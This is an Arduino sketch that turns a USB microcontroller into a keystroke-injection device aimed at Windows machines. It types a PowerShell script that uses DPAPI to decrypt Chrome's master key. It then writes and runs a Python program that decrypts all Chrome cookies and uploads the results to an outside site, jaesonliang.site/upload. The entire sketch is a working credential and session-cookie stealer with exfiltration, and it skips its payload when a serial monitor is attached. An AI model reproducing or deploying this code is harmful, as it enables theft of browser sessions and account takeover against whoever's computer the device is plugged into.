#include <Keyboard.h>


bool safeMode = false;


void setup() {
  delay(3000); // Give time to open Serial Monitor

  // Check if Serial is connected, enter safe mode
  Serial.begin(9600);
  delay(100);
  if (Serial) {
    safeMode = true;
  }

  if (safeMode) {
    // Do nothing, allow sketch upload
    while (1); // Stop execution
  }


  delay(10000);

  //open powershell
  Keyboard.begin();
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.println("powershell");
  delay(500);
  Keyboard.println("pip install pycryptodome");
  delay(500);



  //open new powershell
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(50);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.println("powershell");
  delay(500);


  //make the encrytion program
  Keyboard.println("@'");
  Keyboard.println("param (");
  Keyboard.println("    [Parameter(Mandatory=$true)]");
  Keyboard.println("    [string]$InputFilePath,");
  Keyboard.println("");
  Keyboard.println("    [Parameter(Mandatory=$true)]");
  Keyboard.println("    [string]$OutputFilePath");
  Keyboard.println(")");
  Keyboard.println("");
  Keyboard.println("# Load the necessary .NET assembly");
  Keyboard.println("Add-Type -AssemblyName \"System.Security\"");
  Keyboard.println("");
  Keyboard.println("# Read the file");
  Keyboard.println("$localStateContent = Get-Content -Path $InputFilePath -Raw");
  Keyboard.println("");
  Keyboard.println("# Use regex to find the encrypted_key value");
  Keyboard.println("$matchFound = $localStateContent -match '\"encrypted_key\"\\s*:\\s*\"([^\"]+)\"'");
  Keyboard.println("");
  Keyboard.println("if (-not $matchFound) {");
  Keyboard.println("    Write-Error \"Could not find 'encrypted_key' in the input file.\"");
  Keyboard.println("    exit");
  Keyboard.println("}");
  Keyboard.println("");
  Keyboard.println("$encryptedKeyBase64 = $matches[1]");
  Keyboard.println("");
  Keyboard.println("# Convert the base64 string to byte array");
  Keyboard.println("$encryptedKeyBytes = [System.Convert]::FromBase64String($encryptedKeyBase64)");
  Keyboard.println("");
  Keyboard.println("# Strip the 'DPAPI' prefix");
  Keyboard.println("$dpapiBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]");
  Keyboard.println("");
  Keyboard.println("# Decrypt the bytes using DPAPI");
  Keyboard.println("$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($dpapiBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)");
  Keyboard.println("");
  Keyboard.println("# Write the decrypted master key to the output file");
  Keyboard.println("[System.IO.File]::WriteAllBytes($OutputFilePath, $decryptedBytes)");
  Keyboard.println("");
  Keyboard.println("Write-Output \"Master key written to $OutputFilePath\"");
  Keyboard.println("'@ | Set-Content -Path \"decryptor.ps1\"");
  delay(200);


  //get curr user name
  Keyboard.println("$curruser = $env:USERNAME");


  //run
  Keyboard.println("$inputFilePath = \"C:\\Users\\$curruser\\AppData\\Local\\Google\\Chrome\\User Data\\Local State\"");
  Keyboard.println("$outputFilePath = \"C:\\Users\\$curruser\\key.txt\"");
  delay(50);
  Keyboard.println("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass");
  delay(50);
  Keyboard.println("./decryptor.ps1 -InputFilePath $inputFilePath -OutputFilePath $outputFilePath");
  delay(200);


  //make py file
  Keyboard.println(F("@\""));
  Keyboard.println(F("import os"));
  Keyboard.println(F("import sqlite3"));
  Keyboard.println(F("import shutil"));
  Keyboard.println(F("from Crypto.Cipher import AES"));
  Keyboard.println(F("import argparse"));
  Keyboard.println(F("from datetime import datetime, timedelta"));
  Keyboard.println(F(""));
  Keyboard.println(F("def chrome_time_conversion(chromedate):"));
  Keyboard.println(F("    try:"));
  Keyboard.println(F("        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)"));
  Keyboard.println(F("    except:"));
  Keyboard.println(F("        return chromedate"));
  Keyboard.println(F(""));
  Keyboard.println(F("def decrypt_value(buff, master_key):"));
  Keyboard.println(F("    try:"));
  Keyboard.println(F("        iv, payload = buff[3:15], buff[15:]"));
  Keyboard.println(F("        cipher = AES.new(master_key, AES.MODE_GCM, iv)"));
  Keyboard.println(F("        return cipher.decrypt(payload)[:-16].decode()"));
  Keyboard.println(F("    except:"));
  Keyboard.println(F("        return \"Chrome < 80\""));
  Keyboard.println(F(""));
  Keyboard.println(F("if __name__ == '__main__':"));
  Keyboard.println(F("    parser = argparse.ArgumentParser(description=\"Retrieve Encrypted Chrome Cookie Details.\")"));
  Keyboard.println(F("    parser.add_argument(\"-f\", \"--file\", required=True, help=\"Path to the Chrome Cookies database.\")"));
  Keyboard.println(F("    parser.add_argument(\"-k\", \"--key\", required=True, help=\"Path to the master key file.\")"));
  Keyboard.println(F("    parser.add_argument(\"-o\", \"--output\", required=True, help=\"Path to the output text file.\")"));
  Keyboard.println(F("    args = parser.parse_args()"));
  Keyboard.println(F(""));
  Keyboard.println(F("    with open(args.key, 'rb') as f:"));
  Keyboard.println(F("        master_key = f.read()"));
  Keyboard.println(F(""));
  Keyboard.println(F("    temp_db = \"CookiesTemp.db\""));
  Keyboard.println(F("    shutil.copy2(args.file, temp_db)"));
  Keyboard.println(F(""));
  Keyboard.println(F("    grouped_data = {}"));
  Keyboard.println(F(""));
  Keyboard.println(F("    with sqlite3.connect(temp_db) as conn:"));
  Keyboard.println(F("        cursor = conn.cursor()"));
  Keyboard.println(F("        for row in cursor.execute(\"SELECT host_key, name, encrypted_value, creation_utc, last_access_utc, expires_utc FROM cookies\"):"));
  Keyboard.println(F("            host_key = row[0]"));
  Keyboard.println(F("            data = {"));
  Keyboard.println(F("                'name': row[1],"));
  Keyboard.println(F("                'decrypted_value': decrypt_value(row[2], master_key),"));
  Keyboard.println(F("                'creation_utc': chrome_time_conversion(row[3]),"));
  Keyboard.println(F("                'last_access_utc': chrome_time_conversion(row[4]),"));
  Keyboard.println(F("                'expires_utc': chrome_time_conversion(row[5])"));
  Keyboard.println(F("            }"));
  Keyboard.println(F(""));
  Keyboard.println(F("            if host_key not in grouped_data:"));
  Keyboard.println(F("                grouped_data[host_key] = []"));
  Keyboard.println(F("            grouped_data[host_key].append(data)"));
  Keyboard.println(F(""));
  Keyboard.println(F("    with open(args.output, 'w', encoding='utf-8') as output_file:"));
  Keyboard.println(F("        for host, cookies in grouped_data.items():"));
  Keyboard.println(F("            output_file.write(\"=\" * 70 + \"\\n\")"));
  Keyboard.println(F("            output_file.write(f\"Host: {host}\\n\")"));
  Keyboard.println(F("            for cookie in cookies:"));
  Keyboard.println(F("                output_file.write(\"\\n\")"));
  Keyboard.println(F("                for key, val in cookie.items():"));
  Keyboard.println(F("                    output_file.write(f\"{key.title().replace('_', ' ')}: {val}\\n\")"));
  Keyboard.println(F("            output_file.write(\"=\" * 70 + \"\\n\\n\")"));
  Keyboard.println(F(""));
  Keyboard.println(F("    print(f\"Output written to {args.output}\")"));
  Keyboard.println(F("\"@ | Set-Content -Path decryptCookie.py"));
  delay(50);


  // run
  Keyboard.println("$cookiesPath = \"C:\\Users\\$curruser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\"");
  Keyboard.println("$keyPath = \"C:\\Users\\$curruser\\key.txt\"");
  Keyboard.println("$resultPath = \"C:\\Users\\$curruser\\result.txt\"");
  Keyboard.println("python decryptCookie.py -f \"$cookiesPath\" -k \"$keyPath\" -o \"$resultPath\"");

  delay(100);

  // upload the file
  Keyboard.println(F("$filePath = \"C:\\Users\\$curruser\\result.txt\""));
  Keyboard.println(F("$fileName = [System.IO.Path]::GetFileName($filePath)"));


  Keyboard.println(F("$fileBytes = [System.IO.File]::ReadAllBytes($filePath)"));
  Keyboard.println(F("$fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)"));


  Keyboard.println(F("$boundary = \"----PowerShellBoundary$(Get-Random)\""));
  Keyboard.println(F("$lf = \"`r`n\""));


  Keyboard.println(F("$bodyLines = @("));
  Keyboard.println(F("    \"--$boundary\","));
  Keyboard.println(F("    \"Content-Disposition: form-data; name=`\"file`\"; filename=`\"$fileName`\"\","));
  Keyboard.println(F("    \"Content-Type: text/plain\","));
  Keyboard.println(F("    \"\","));
  Keyboard.println(F("    $fileContent,"));
  Keyboard.println(F("    \"--$boundary--\","));
  Keyboard.println(F("    \"\""));
  Keyboard.println(F(")"));

  Keyboard.println(F("$body = $bodyLines -join $lf"));
  Keyboard.println(F("$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($body)"));

  Keyboard.println(F("$headers = @{"));
  Keyboard.println(F("    \"Content-Type\" = \"multipart/form-data; boundary=$boundary\""));
  Keyboard.println(F("}"));

  Keyboard.println(F("$url = \"https://jaesonliang.site/upload\""));

  Keyboard.println(F("$response = Invoke-WebRequest -Uri $url -Method POST -Body $bodyBytes -Headers $headers"));

  Keyboard.end();
}




void loop() {
  // put your main code here, to run repeatedly:

}


